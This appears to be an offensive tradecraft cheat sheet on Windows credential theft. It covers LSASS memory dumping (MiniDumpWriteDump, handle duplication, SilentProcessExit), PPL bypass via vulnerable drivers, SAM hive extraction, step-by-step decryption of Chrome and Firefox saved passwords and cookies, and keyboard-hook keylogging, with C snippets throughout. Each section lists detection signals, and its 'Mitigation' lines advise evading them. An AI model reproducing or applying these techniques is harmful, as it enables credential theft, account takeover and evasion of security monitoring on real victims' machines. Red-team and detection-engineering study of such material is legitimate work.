# Credential Access Techniques

## LSASS Dumping - MiniDumpWriteDump

> OPSEC: 🔴 High
> Sysmon: Event ID 10 (ProcessAccess on lsass.exe with PROCESS_VM_READ)
> ETW: Microsoft-Windows-Threat-Intelligence (lsass handle open)
> EDR Hooks: NtOpenProcess (target=lsass), NtReadVirtualMemory, MiniDumpWriteDump
> Signature: OpenProcess on lsass.exe PID; dbghelp.dll load; dump file creation
> Mitigation: Use handle duplication method; dump to memory (not file); avoid loading dbghelp.dll by name

```c
#include <dbghelp.h>
#pragma comment(lib, "dbghelp.lib")
HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
HANDLE hFile = CreateFileA("dump.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
MiniDumpWriteDump(hProc, lsassPid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
```

## Finding LSASS PID
```c
HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
PROCESSENTRY32 pe = { sizeof(pe) };
Process32First(hSnap, &pe);
do {
    if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) { pid = pe.th32ProcessID; break; }
} while (Process32Next(hSnap, &pe));
```

## LSASS Dump via Handle Duplication

> OPSEC: 🟡 Medium
> Sysmon: Event ID 10 (ProcessAccess) — but not directly on lsass
> ETW: NtDuplicateObject call logged
> EDR Hooks: NtDuplicateObject, NtOpenProcess (on intermediate process)
> Signature: Enumerating handles across processes; duplicating lsass handle from another process
> Mitigation: Find process that already holds lsass handle (e.g., csrss.exe); use indirect syscalls

- Find existing LSASS handle in another process
- NtDuplicateObject to get handle in our process
- Avoids calling OpenProcess on LSASS directly

## LSASS Dump via RtlReportSilentProcessExit

> OPSEC: 🟡 Medium
> Sysmon: Registry modification events (SilentProcessExit key)
> ETW: Registry write telemetry; WerFault.exe process creation
> EDR Hooks: RegSetValueEx on SilentProcessExit path; RtlReportSilentProcessExit
> Signature: SilentProcessExit registry key creation for lsass.exe; WerFault spawning with dump
> Mitigation: Clean up registry keys after dump; use non-standard dump folder path

- Configure LSASS for silent process exit monitoring via registry
- HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe
- Set ReportingMode, LocalDumpFolder, DumpType
- Call RtlReportSilentProcessExit — Windows dumps LSASS automatically

## PPL Bypass

> OPSEC: 🔴 High
> Sysmon: Event ID 6 (Driver Load) for BYOVD; Event ID 13 (Registry) for driver registration
> ETW: Microsoft-Windows-Kernel-Process (driver load); kernel callback telemetry
> EDR Hooks: Kernel-level — driver signature enforcement, CI.dll validation
> Signature: Loading known-vulnerable signed driver; kernel memory modification
> Mitigation: Use handle duplication from processes with existing lsass access instead

- LSASS runs as Protected Process Light on modern Windows
- BYOVD: Load vulnerable signed driver to remove PPL flag in kernel
- Handle duplication from processes that already have LSASS access

## SAM Database Dumping

> OPSEC: 🔴 High
> Sysmon: Event ID 13 (Registry access to SAM/SYSTEM hives)
> ETW: Registry access telemetry; file I/O on config directory
> EDR Hooks: RegSaveKey (SAM/SYSTEM hives); NtOpenKey on SAM path
> Signature: RegSaveKey on SAM or SYSTEM hive; Volume Shadow Copy access to config files
> Mitigation: Use in-memory extraction via MS-SAMR RPC; avoid writing hive files to disk

### Local (Registry)
```c
RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0, KEY_READ, &hKey);
RegSaveKeyA(hKey, "sam.hiv", NULL);
// Also need SYSTEM hive for decryption keys
RegSaveKeyA(hSystemKey, "system.hiv", NULL);
```

### From Disk
```c
// C:\Windows\System32\config\SAM (requires SYSTEM or offline)
// Use Volume Shadow Copy for live system access
```

### Remote (MS-SAMR)
```c
// SAM Remote Protocol over RPC
// SamConnect2 → SamrEnumerateDomainsInSamServer
// SamrLookupDomainInSamServer → SamrOpenDomain
// SamrEnumerateUsersInDomain
```

## Browser Credential Extraction

> OPSEC: 🟡 Medium
> Sysmon: Event ID 11 (File access to Chrome/Firefox profile directories)
> ETW: File I/O telemetry on browser data files
> EDR Hooks: CryptUnprotectData (DPAPI), file access to Login Data/Cookies SQLite
> Signature: Non-browser process reading Login Data, Cookies, Local State files; DPAPI calls
> Mitigation: Copy files to temp location before reading; use direct SQLite parsing (no sqlite3.dll load)

### Chrome (v80+)
```c
// 1. Read encrypted_key from %LOCALAPPDATA%\Google\Chrome\User Data\Local State (JSON)
// 2. Base64 decode, strip "DPAPI" prefix (5 bytes)
// 3. CryptUnprotectData to get AES-256-GCM key
// 4. Read cookies: %LOCALAPPDATA%\...\Default\Cookies (SQLite)
// 5. For each encrypted_value: strip "v10" prefix (3 bytes), decrypt with AES-256-GCM
//    - Nonce: bytes 3-15, Ciphertext: bytes 15 to end-16, Tag: last 16 bytes
// Saved passwords: same scheme, Login Data SQLite (origin_url, username_value, password_value)
```

### Firefox
```c
// Cookies: %APPDATA%\Mozilla\Firefox\Profiles\<profile>\cookies.sqlite
// Table: moz_cookies (name, value, host, path, expiry)
// Saved logins: logins.json + key4.db (NSS/PKCS11 encryption)
// Requires NSS library or key extraction from key4.db to decrypt
```

## Keylogging

> OPSEC: 🟡 Medium
> Sysmon: Event ID 12/13 (if hook registered via registry)
> ETW: Microsoft-Windows-Win32k (keyboard hook registration)
> EDR Hooks: SetWindowsHookEx (WH_KEYBOARD_LL), RegisterRawInputDevices
> Signature: Low-level keyboard hook from non-standard process; RIDEV_INPUTSINK flag
> Mitigation: Use GetAsyncKeyState polling (no hook registration); run from legitimate-looking process

```c
// Method 1: Low-level keyboard hook
HHOOK hHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKbd = (KBDLLHOOKSTRUCT*)lParam;
        // Log pKbd->vkCode
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}
// Method 2: GetAsyncKeyState polling
// Method 3: Raw Input API (RAWINPUTDEVICE with RIDEV_INPUTSINK)
```
